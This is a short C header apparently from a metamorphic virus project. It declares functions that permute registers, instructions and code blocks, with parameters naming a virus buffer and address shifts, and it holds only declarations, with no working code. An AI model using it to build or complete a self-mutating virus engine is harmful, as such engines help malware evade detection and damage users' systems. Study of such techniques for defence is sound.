#ifndef METAMORPHISM_H
# define METAMORPHISM_H

# include "accessors.h"
# include <stdbool.h>
# include <stdint.h>
# include <stddef.h>

bool		permutate_registers(struct safe_ptr ref, uint64_t seed);
bool		permutate_instructions(struct safe_ptr ref, uint64_t seed);
bool		permutate_blocks(struct safe_ptr virus_ref, struct safe_ptr virus_buffer_ref,
			size_t *virus_buffer_size, void *virus_address_in_ref,
			int32_t *virus_address_shift, uint64_t seed);

#endif
